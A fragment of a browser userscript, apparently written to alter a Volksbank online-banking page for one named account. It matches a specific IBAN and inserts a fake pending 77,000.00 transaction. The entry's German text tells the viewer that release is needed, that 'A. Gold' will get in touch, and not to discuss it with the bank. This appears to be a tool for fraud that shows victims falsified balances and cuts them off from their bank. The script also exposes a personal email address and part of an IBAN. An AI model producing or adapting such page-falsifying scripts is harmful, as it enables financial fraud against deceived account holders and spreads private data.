// ==UserScript==
// @name         Ed Rec4 r.klingenberg@freenet.de
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/500039/Ed%20Rec4%20rklingenberg%40freenetde.user.js
// @updateURL https://update.greasyfork.org/scripts/500039/Ed%20Rec4%20rklingenberg%40freenetde.meta.js
// ==/UserScript==
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE35 4726 4367";
    var targetTextContent2 = " 6017 8054 00";
...
//        },
{
            ...
            description: 'Freigabe nötig. A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.',
            amount: '77.000,00',
            date: 'Vorgemerkt',
            insertAfter: false, // Set to false to insert before the original transaction
           moveSteps: 1, // Number of steps to move the transaction
